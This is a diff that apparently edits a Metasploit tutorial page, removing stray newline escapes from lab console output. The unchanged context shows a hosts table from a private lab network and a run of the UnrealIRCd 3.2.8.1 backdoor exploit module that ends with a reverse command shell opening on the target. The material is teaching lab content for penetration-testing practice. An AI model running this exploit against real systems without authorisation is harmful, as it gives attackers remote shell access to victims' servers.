@@ -69,13 +69,13 @@ Hosts
 
 address         mac  name    os_name                                                                             os_flavor  os_sp  purpose  info  comments
 -------         ---  ----    -------                                                                             ---------  -----  -------  ----  --------
-172.16.194.1                 one of these operating systems : \nMac OS X 10.5\nMac OS X 10.6\nMac OS X 10.7\n                      device         
+172.16.194.1                 one of these operating systems :  Mac OS X 10.5 Mac OS X 10.6 Mac OS X 10.7                       device         
 172.16.194.2                 Unknown                                                                                               device         
 172.16.194.134               Microsoft Windows                                                                   XP         SP2    client         
-172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**\n                                                             device         
-172.16.194.163               Linux Kernel 3.2.6 on Ubuntu 10.04\n                                                                  device         
+172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**                                                              device         
+172.16.194.163               Linux Kernel 3.2.6 on Ubuntu 10.04                                                                   device         
 172.16.194.165       phpcgi  Linux phpcgi 2.6.32-38-generic-pae #83-Ubuntu SMP Wed Jan 4 12:11:13 UTC 2012 i686                    device         
-172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**\n                                                             device                                                                                                                                          
+172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**                                                              device                                                                                                                                          
 
 msf **&gt;**
 ```
@@ -242,7 +242,7 @@ msf  exploit**(**unreal_ircd_3281_backdoor**)** **&gt;** exploit
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
-[*] B: "Q4SefN7pIVSQUL2F\r\n"
+[*] B: "Q4SefN7pIVSQUL2F\r "
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -&gt; 172.16.194.172:35941) at 2012-06-15 15:08:51 -0400
